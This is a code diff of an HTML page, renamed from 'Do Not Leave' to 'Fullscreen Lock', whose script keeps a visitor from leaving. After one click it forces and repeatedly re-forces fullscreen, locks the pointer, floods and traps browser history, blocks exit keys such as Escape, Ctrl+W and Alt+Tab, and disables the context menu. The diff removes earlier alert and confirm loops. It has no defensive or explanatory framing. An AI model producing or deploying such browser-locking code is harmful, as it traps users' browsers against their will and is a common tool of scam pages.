@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Do Not Leave</title>
+  <title>Fullscreen Lock</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
@@ -13,17 +13,17 @@
       background: black;
       color: white;
       overflow: hidden;
-      font-family: monospace;
       cursor: none;
+      font-family: monospace;
+      user-select: none;
     }
 
-    #start {
+    #gate {
       position: fixed;
       inset: 0;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 20px;
       background: black;
       z-index: 9999;
     }
@@ -40,78 +40,60 @@
 </head>
 <body>
 
-<div id="start">
+<div id="gate">
   <button id="enter">Click to continue</button>
 </div>
 
 <script>
+  const gate = document.getElementById("gate");
   const enter = document.getElementById("enter");
-  const start = document.getElementById("start");
 
-  function fullscreen() {
-    document.documentElement.requestFullscreen().catch(() => {});
+  function forceFullscreen() {
+    if (!document.fullscreenElement) {
+      document.documentElement.requestFullscreen().catch(() => {});
+    }
   }
 
-  function pointerLock() {
+  function lockPointer() {
     document.body.requestPointerLock?.();
   }
 
   function floodHistory() {
-    for (let i = 0; i < 50; i++) {
+    for (let i = 0; i < 40; i++) {
       history.pushState(null, "", location.href);
     }
   }
 
-  function alertLoop() {
-    setTimeout(() => {
-      alert("You are not done yet.");
-      alertLoop();
-    }, 3000);
-  }
-
-  function confirmLoop() {
-    setTimeout(() => {
-      if (!confirm("Are you sure you want to leave?")) {
-        confirmLoop();
-      } else {
-        confirmLoop();
-      }
-    }, 5000);
-  }
-
   enter.onclick = () => {
-    start.remove();
-    fullscreen();
-    pointerLock();
+    gate.remove();
+    forceFullscreen();
+    lockPointer();
     floodHistory();
-    alertLoop();
-    confirmLoop();
   };
 
-  // Re-enter fullscreen constantly
+  // Instant fullscreen recovery
   document.addEventListener("fullscreenchange", () => {
     if (!document.fullscreenElement) {
-      setTimeout(fullscreen, 200);
+      setTimeout(forceFullscreen, 0);
     }
   });
+
+  // Constant fullscreen spam (browser will throttle but still annoying)
+  setInterval(() => {
+    forceFullscreen();
+  }, 200);
 
   // Trap back button
   window.addEventListener("popstate", () => {
     history.pushState(null, "", location.href);
   });
 
-  // beforeunload dialog
-  window.addEventListener("beforeunload", (e) => {
-    e.preventDefault();
-    e.returnValue = "";
-  });
-
-  // Block exit keys (best effort)
+  // Block common escape keys (best effort)
   document.addEventListener("keydown", (e) => {
     const blocked =
       e.key === "Escape" ||
       e.key === "F11" ||
-      (e.ctrlKey && ["w", "W", "r", "R"].includes(e.key)) ||
+      (e.ctrlKey && ["w", "W", "t", "T", "r", "R"].includes(e.key)) ||
       (e.altKey && e.key === "Tab");
 
     if (blocked) {
@@ -123,9 +105,9 @@
   // Pointer lock persistence
   setInterval(() => {
     if (document.hasFocus()) {
-      pointerLock();
+      lockPointer();
     }
-  }, 1000);
+  }, 500);
 
   document.addEventListener("contextmenu", e => e.preventDefault());
   document.addEventListener("dragstart", e => e.preventDefault());
